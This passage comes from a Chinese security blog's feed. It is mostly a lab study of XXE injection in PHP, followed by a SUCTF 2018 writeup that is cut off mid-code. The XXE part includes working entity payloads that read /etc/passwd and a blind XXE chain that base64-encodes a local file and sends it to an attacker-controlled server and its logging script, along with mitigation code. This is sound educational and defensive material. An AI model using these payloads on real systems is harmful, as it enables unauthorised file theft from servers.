), php5.3(libxml Version 2.7.8)。Linux中需要将libxml低于libxml2.9.1的版本编译到PHP中，可以使用phpinfo()查看libxml的版本信息。  </p><a id="more"></a><h3 id="坑点："><a href="#坑点：" class="headerlink" title="坑点："></a>坑点：</h3><p>在远程XXE，evilxxe.dtd路径写<code>file://D:/1.txt</code>出错</p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/XXE/1531035455684.png" alt="1531035455684"></p><p>evilxxe.dtd路径写<code>file:///D:/1.txt</code> 成功</p><p>在BlindXXE的php里</p><p>出错，路径D:前加了<code>/</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/D:/1.txt&quot;&gt;</span><br></pre></td></tr></table></figure><p>去掉<code>/</code>成功</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=D:/1.txt&quot;&gt;</span><br></pre></td></tr></table></figure><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><p><strong>XXE：</strong>XML External Entity 即外部实体，从安全角度理解成XML External Entity attack 外部实体注入攻击。 </p><p><strong>原理：</strong>XXE (XML External Entity Injection) 漏洞发生在应用程序解析 XML 输入时，没有禁止外部实体的加载。 </p><p><strong>DTD：</strong>Document Type Definition 即文档类型定义，用来为XML文档定义语义约束。可以嵌入在XML文档中(内部声明)，也可以独立的放在一个文件中(外部引用)，由于其支持的数据类型有限，无法对元素或属性的内容进行详细规范，在可读性和可扩展性方面也比不上XML Schema。 </p><p><strong>参考链接：</strong><a href="http://www.w3school.com.cn/dtd/" target="_blank" rel="noopener">http://www.w3school.com.cn/dtd/</a></p><p>首先了解下基本的PAYLOAD结构，然后再介绍每部分涉及的知识点，如下PAYLOAD开头进行了XML的声明，然后使用DTD声明实体(这里使用了file协议)，最后使用XML获取实体的数据。 </p><h3 id="XML基础"><a href="#XML基础" class="headerlink" title="XML基础"></a>XML基础</h3><p>（copy 来自 <a href="https://thief.one/2017/06/20/1/）" target="_blank" rel="noopener">https://thief.one/2017/06/20/1/）</a></p><p>XML被设计为传输和存储数据，其焦点是数据的内容，其把数据从HTML分离，是独立于软件和硬件的信息传输工具。</p><h4 id="XML文档结构"><a href="#XML文档结构" class="headerlink" title="XML文档结构"></a>XML文档结构</h4><p>XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--XML申明--&gt;</span><br><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt; </span><br><span class="line"></span><br><span class="line">&lt;!--文档类型定义--&gt;</span><br><span class="line">&lt;!DOCTYPE note [  &lt;!--定义此文档是 note 类型的文档--&gt;</span><br><span class="line">&lt;!ELEMENT note (to,from,heading,body)&gt;  &lt;!--定义note元素有四个元素--&gt;</span><br><span class="line">&lt;!ELEMENT to (#PCDATA)&gt;     &lt;!--定义to元素为”#PCDATA”类型--&gt;</span><br><span class="line">&lt;!ELEMENT from (#PCDATA)&gt;   &lt;!--定义from元素为”#PCDATA”类型--&gt;</span><br><span class="line">&lt;!ELEMENT head (#PCDATA)&gt;   &lt;!--定义head元素为”#PCDATA”类型--&gt;</span><br><span class="line">&lt;!ELEMENT body (#PCDATA)&gt;   &lt;!--定义body元素为”#PCDATA”类型--&gt;</span><br><span class="line">]]]&gt;</span><br><span class="line"></span><br><span class="line">&lt;!--文档元素--&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">&lt;to&gt;Dave&lt;/to&gt;</span><br><span class="line">&lt;from&gt;Tom&lt;/from&gt;</span><br><span class="line">&lt;head&gt;Reminder&lt;/head&gt;</span><br><span class="line">&lt;body&gt;You are a good man&lt;/body&gt;</span><br><span class="line">&lt;/note&gt;</span><br></pre></td></tr></table></figure><p>由于xxe漏洞与DTD文档相关，因此重点介绍DTD的概念。</p><h4 id="DTD"><a href="#DTD" class="headerlink" title="DTD"></a>DTD</h4><p>文档类型定义（DTD）可定义合法的XML文档构建模块，它使用一系列合法的元素来定义文档的结构。DTD 可被成行地声明于XML文档中（内部引用），也可作为一个外部引用。<br>内部声明DTD:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素 [元素声明]&gt;</span><br></pre></td></tr></table></figure><p>引用外部DTD:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt;</span><br></pre></td></tr></table></figure><p>DTD文档中有很多重要的关键字如下：</p><ul><li>DOCTYPE（DTD的声明）</li><li>ENTITY（实体的声明）</li><li>SYSTEM、PUBLIC（外部资源申请）</li></ul><h4 id="实体"><a href="#实体" class="headerlink" title="实体"></a>实体</h4><p>实体可以理解为变量，其必须在DTD中定义申明，可以在文档中的其他位置引用该变量的值。<br>实体按类型主要分为以下四种：</p><ul><li>内置实体 (Built-in entities)</li><li>字符实体 (Character entities)</li><li>通用实体 (General entities)</li><li>参数实体 (Parameter entities)</li></ul><p>实体根据引用方式，还可分为内部实体与外部实体，看看这些实体的申明方式。<br>完整的实体类别可参考 <a href="https://www.tutorialspoint.com/dtd/dtd_entities.htm" target="_blank" rel="noopener">DTD - Entities</a></p><h4 id="实体类别介绍"><a href="#实体类别介绍" class="headerlink" title="实体类别介绍"></a>实体类别介绍</h4><p>参数实体用%实体名称申明，引用时也用%实体名称;其余实体直接用实体名称申明，引用时用&amp;实体名称。<br>参数实体只能在DTD中申明，DTD中引用；其余实体只能在DTD中申明，可在xml文档中引用。</p><p>内部实体：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;</span><br></pre></td></tr></table></figure><p>外部实体:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 SYSTEM &quot;URI&quot;&gt;</span><br></pre></td></tr></table></figure><p>参数实体：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % 实体名称 &quot;实体的值&quot;&gt;</span><br><span class="line">或者</span><br><span class="line">&lt;!ENTITY % 实体名称 SYSTEM &quot;URI&quot;&gt;</span><br></pre></td></tr></table></figure><p>实例演示：除参数实体外实体+内部实体</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE a [</span><br><span class="line">    &lt;!ENTITY name &quot;nMask&quot;&gt;]&gt;</span><br><span class="line">&lt;foo&gt;</span><br><span class="line">        &lt;value&gt;&amp;name;&lt;/value&gt; </span><br><span class="line">&lt;/foo&gt;</span><br></pre></td></tr></table></figure><p>实例演示：参数实体+外部实体</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE a [</span><br><span class="line">    &lt;!ENTITY % name SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">    %name;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure><p>注意：%name（参数实体）是在DTD中被引用的，而&amp;name（其余实体）是在xml文档中被引用的。</p><p>由于xxe漏洞主要是利用了DTD引用外部实体导致的漏洞，那么重点看下能引用哪些类型的外部实体。</p><h4 id="外部实体"><a href="#外部实体" class="headerlink" title="外部实体"></a>外部实体</h4><p>外部实体即在DTD中使用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 SYSTEM &quot;URI&quot;&gt;</span><br></pre></td></tr></table></figure><p>语法引用外部的实体，而非内部实体，那么URL中能写哪些类型的外部实体呢？<br>主要的有file、http、https、ftp等等，当然不同的程序支持的不一样：<br><a href="https://thief.one/upload_image/20170620/1.png" target="_blank" rel="noopener"><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/XXE/1.png" alt="img"></a><br>实例演示：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE a [</span><br><span class="line">    &lt;!ENTITY content SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;</span><br><span class="line">&lt;foo&gt;</span><br><span class="line">        &lt;value&gt;&amp;content;&lt;/value&gt; </span><br><span class="line">&lt;/foo&gt;</span><br></pre></td></tr></table></figure><h2 id="普通XXE"><a href="#普通XXE" class="headerlink" title="普通XXE"></a>普通XXE</h2><p>复现环境：<a href="http://vulhub.org/#/environments/php_xxe/" target="_blank" rel="noopener">http://vulhub.org/#/environments/php_xxe/</a> </p><h3 id="simplexml-load-string-php"><a href="#simplexml-load-string-php" class="headerlink" title="simplexml_load_string.php"></a>simplexml_load_string.php</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$data = file_get_contents(<span class="string">'php://input'</span>);</span><br><span class="line">$xml = simplexml_load_string($data);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> $xml-&gt;name;</span><br></pre></td></tr></table></figure><p>利用</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE xxe [</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT name ANY &gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY xxe SYSTEM "file:///etc/passwd" &gt;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>&amp;xxe;<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/XXE/1530963638752.png" alt="1530963638752"></p><h3 id="SimpleXMLElement-php"><a href="#SimpleXMLElement-php" class="headerlink" title="SimpleXMLElement.php"></a>SimpleXMLElement.php</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$data = file_get_contents(<span class="string">'php://input'</span>);</span><br><span class="line">$xml = <span class="keyword">new</span> SimpleXMLElement($data);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> $xml-&gt;name;</span><br></pre></td></tr></table></figure><p>利用</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE xxe [</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT name ANY &gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY xxe SYSTEM "file:///etc/passwd" &gt;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>&amp;xxe;<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/XXE/1530964061120.png" alt="1530964061120"></p><h3 id="dom-php"><a href="#dom-php" class="headerlink" title="dom.php"></a>dom.php</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$data = file_get_contents(<span class="string">'php://input'</span>);</span><br><span class="line"></span><br><span class="line">$dom = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">$dom-&gt;loadXML($data);</span><br><span class="line"></span><br><span class="line">print_r($dom);</span><br></pre></td></tr></table></figure><p>同样利用上面的xml</p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/XXE/1530964142246.png" alt="1530964142246"></p><h2 id="远程XXE"><a href="#远程XXE" class="headerlink" title="远程XXE"></a>远程XXE</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$xml = <span class="string">&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE a [</span></span><br><span class="line"><span class="string">&lt;!ENTITY % d SYSTEM "http://192.168.190.1/XXE/evilxxe.dtd"&gt;</span></span><br><span class="line"><span class="string">%d;</span></span><br><span class="line"><span class="string">]&gt;</span></span><br><span class="line"><span class="string">&lt;c&gt;&amp;b;&lt;/c&gt;</span></span><br><span class="line"><span class="string">EOF;</span></span><br><span class="line">libxml_disable_entity_loader(<span class="keyword">false</span>);</span><br><span class="line">$data = simplexml_load_string($xml, <span class="string">'SimpleXMLElement'</span>, LIBXML_NOENT);</span><br><span class="line"><span class="comment">#$data = simplexml_load_string($xml);</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;pre&gt;'</span>;</span><br><span class="line">print_r($data);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;/pre&gt;'</span>;</span><br></pre></td></tr></table></figure><p>evilxxe.dtd</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY b SYSTEM &quot;file:///D:/1.txt&quot;&gt;</span><br></pre></td></tr></table></figure><p>1.txt的内容是<code>fffffffffffffffffffffff</code></p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/XXE/1531035307004.png" alt="1531035307004"></p><h2 id="Blind-XXE"><a href="#Blind-XXE" class="headerlink" title="Blind XXE"></a>Blind XXE</h2><p>对于传统的XXE来说，要求攻击者只有在服务器有回显或者报错的基础上才能使用XXE漏洞来读取服务器端文件，如果没有回显则可以使用Blind XXE漏洞来构建一条带外信道提取数据。 </p><p>xxe3.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$xml = <span class="string">&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE ANY [</span></span><br><span class="line"><span class="string">&lt;!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=D:/1.txt"&gt;</span></span><br><span class="line"><span class="string">&lt;!ENTITY % remote SYSTEM "http://192.168.190.1/XXE/evilxxe2.dtd"&gt;</span></span><br><span class="line"><span class="string">%remote;</span></span><br><span class="line"><span class="string">%all;</span></span><br><span class="line"><span class="string">]&gt;</span></span><br><span class="line"><span class="string">&lt;c&gt;&amp;send;&lt;/c&gt;</span></span><br><span class="line"><span class="string">EOF;</span></span><br><span class="line"></span><br><span class="line">libxml_disable_entity_loader(<span class="keyword">false</span>);</span><br><span class="line">$data = simplexml_load_string($xml, <span class="string">'SimpleXMLElement'</span>, LIBXML_NOENT);</span><br><span class="line"><span class="comment">#$data = simplexml_load_string($xml);</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;pre&gt;'</span>;</span><br><span class="line">print_r($data);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;/pre&gt;'</span>;</span><br></pre></td></tr></table></figure><p>evilxxe2.dtd</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % all</span><br><span class="line">&quot;&lt;!ENTITY send SYSTEM &apos;http://192.168.190.1/XXE/test.php?file=%file;&apos;&gt;&quot;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure><p>test.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">file_put_contents(<span class="string">"test.txt"</span>, $_GET[<span class="string">'file'</span>]) ;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>访问<a href="http://192.168.190.1/XXE/xxe3.php，存在漏洞的服务器会读出1.txt内容，发送给攻击者服务器上的test.php，然后把读取的数据保存到本地的test.txt中。" target="_blank" rel="noopener">http://192.168.190.1/XXE/xxe3.php，存在漏洞的服务器会读出1.txt内容，发送给攻击者服务器上的test.php，然后把读取的数据保存到本地的test.txt中。</a> </p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/XXE/1531034396346.png" alt="1531034396346"></p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/XXE/1531034282367.png" alt="1531034282367"></p><h2 id="XXE漏洞修复与防御"><a href="#XXE漏洞修复与防御" class="headerlink" title="XXE漏洞修复与防御"></a>XXE漏洞修复与防御</h2><h3 id="使用开发语言提供的禁用外部实体的方法"><a href="#使用开发语言提供的禁用外部实体的方法" class="headerlink" title="使用开发语言提供的禁用外部实体的方法"></a>使用开发语言提供的禁用外部实体的方法</h3><p>PHP：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">libxml_disable_entity_loader(true);</span><br></pre></td></tr></table></figure><p>JAVA:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();</span><br><span class="line">dbf.setExpandEntityReferences(false);</span><br></pre></td></tr></table></figure><p>Python：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">from lxml import etree</span><br><span class="line">xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))</span><br></pre></td></tr></table></figure><h3 id="过滤用户提交的XML数据"><a href="#过滤用户提交的XML数据" class="headerlink" title="过滤用户提交的XML数据"></a>过滤用户提交的XML数据</h3><p>过滤关键词：&lt;!DOCTYPE和&lt;!ENTITY，或者SYSTEM和PUBLIC。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>遇到XML相关的交互过程，以如下步骤判断是否存在漏洞：</p><p>（1）检测XML是否会被解析：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=”<span class="number">1.0</span>” encoding=”UTF<span class="number">-8</span>”<span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE ANY [</span></span><br><span class="line"><span class="meta">&lt;!ENTITY xxe “this is xxe”&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span>&amp;xxe;<span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p>如果$xxe;变成了”this is xxe”，那就继续第二步。</p><p>（2）检测服务器是否支持外部实体：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=”<span class="number">1.0</span>” encoding=”UTF<span class="number">-8</span>”<span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE ANY [</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % xxe SYSTEM “http://youhost/evil.xml”&gt;</span></span><br><span class="line"><span class="meta">%xxe;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure><p>通过查看自己服务器上的日志来判断，看目标服务器是否向你的服务器发了一条请求evil.xml的HTTP request。</p><p>（3）如果上面两步都支持，那么就看能否回显。如果能回显，就可以直接使用外部实体的方式进行攻击。当然有时候服务器会不支持一般实体的引用，也就是在DTD之外无法引用实体，如果这样的话，只能使用Blind XXE攻击。</p><p>（4）如果不能回显，毫无疑问，使用Blind XXE攻击方法。</p><h2 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h2><p><a href="http://www.freebuf.com/column/156863.html" target="_blank" rel="noopener">XXE学习之路-STEP BY STEP</a></p><p><a href="https://security.tencent.com/index.php/blog/msg/69" target="_blank" rel="noopener">https://security.tencent.com/index.php/blog/msg/69</a></p><p><a href="https://blog.csdn.net/u011721501/article/details/43775691" target="_blank" rel="noopener">https://blog.csdn.net/u011721501/article/details/43775691</a></p><p><a href="https://b1ngz.github.io/XXE-learning-note/" target="_blank" rel="noopener">XXE漏洞的简单理解和测试</a></p><p><a href="https://www.anquanke.com/post/id/86075" target="_blank" rel="noopener">XXE漏洞攻防之我见</a></p><p><a href="https://thief.one/2017/06/20/1/" target="_blank" rel="noopener">浅谈XXE漏洞攻击与防御</a></p><p><a href="https://www.owasp.org/index.php/Testing_for_XML_Injection_(OTG-INPVAL-008)" target="_blank" rel="noopener">https://www.owasp.org/index.php/Testing_for_XML_Injection_(OTG-INPVAL-008)</a></p><p><a href="https://phonexicum.github.io/infosec/xxe.html（英文博客真不错）" target="_blank" rel="noopener">https://phonexicum.github.io/infosec/xxe.html（英文博客真不错）</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;为何一直复现不成功&quot;&gt;&lt;a href=&quot;#为何一直复现不成功&quot; class=&quot;headerlink&quot; title=&quot;为何一直复现不成功&quot;&gt;&lt;/a&gt;为何一直复现不成功&lt;/h2&gt;&lt;p&gt;远程和blind XXE在vulhub的php_xxe环境下复现不成功，windows的php5.6（libxml Version 2.9.4 ）不能复现成功（wamp），windwos的php5.2（libxml Version 2.7.7）复现成功(phpstudy)&lt;/p&gt;
&lt;p&gt;(捣鼓了两天心好痛)&lt;/p&gt;
&lt;p&gt;（copy 来自 &lt;a href=&quot;https://lightless.me/archives/Research-On-XXE.html）&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://lightless.me/archives/Research-On-XXE.html）&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;之前我一直在自己的 ubuntu14.04+lnmp 的环境下测试的时候，一直不能复现这个问题，只在 kali 的某个版本上复现成功了，一直不知道原因。直到最近发现了这两个东西：&lt;br&gt;&lt;a href=&quot;http://stackoverflow.com/questions/29811915/external-entities-not-working-in-simplexml&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://stackoverflow.com/questions/29811915/external-entities-not-working-in-simplexml&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;http://php.net/manual/en/libxml.constants.php&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://php.net/manual/en/libxml.constants.php&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;主要是&lt;code&gt;simplexml_load_file&lt;/code&gt;这个函数的问题，在旧版本中是默认解析实体的，但是在新版本中，已经不再默认解析实体了，需要在 simplexml_load_file 函数中指定第三个参数为&lt;code&gt;LIBXML_NOENT&lt;/code&gt;，不然不会解析实体的。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;大部分关于 XXE 的内容都可以参考这篇文章：&lt;a href=&quot;http://security.tencent.com/index.php/blog/msg/69&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://security.tencent.com/index.php/blog/msg/69&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;（copy 来自 &lt;a href=&quot;http://www.freebuf.com/column/156863.html）&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://www.freebuf.com/column/156863.html）&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;libxml2.9.1及以后，默认不解析外部实体。测试的时候window下使用的是php5.2(libxml Version 2.7.7 ), php5.3(libxml Version 2.7.8)。Linux中需要将libxml低于libxml2.9.1的版本编译到PHP中，可以使用phpinfo()查看libxml的版本信息。  &lt;/p&gt;
    
    </summary>
    
      <category term="Web安全" scheme="http://blog.Lhaihai.wang/categories/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="XXE" scheme="http://blog.Lhaihai.wang/categories/Web%E5%AE%89%E5%85%A8/XXE/"/>
    
    
      <category term="XXE" scheme="http://blog.Lhaihai.wang/tags/XXE/"/>
    
  </entry>
  
  <entry>
    <title>suctf2018-web-Writeup</title>
    <link href="http://blog.Lhaihai.wang/2018/07/07/suctf2018-web-Writeup/"/>
    <id>http://blog.Lhaihai.wang/2018/07/07/suctf2018-web-Writeup/</id>
    <published>2018-07-07T13:43:17.000Z</published>
    <updated>2018-07-07T13:50:03.648Z</updated>
    
    <content type="html"><![CDATA[<h2 id="annonymous"><a href="#annonymous" class="headerlink" title="annonymous"></a>annonymous</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$MY = create_function(<span class="string">""</span>,<span class="string">"die(`cat flag.php`);"</span>);</span><br><span class="line">$hash = bin2hex(openssl_random_pseudo_bytes(<span class="number">32</span>));</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">"function SUCTF_$hash()&#123;"</span></span><br><span class="line">    .<span class="string">"global \$MY;"</span></span><br><span class="line">    .<span class="string">"\$MY();"</span></span><br><span class="line">    .<span class="string">"&#125;"</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span 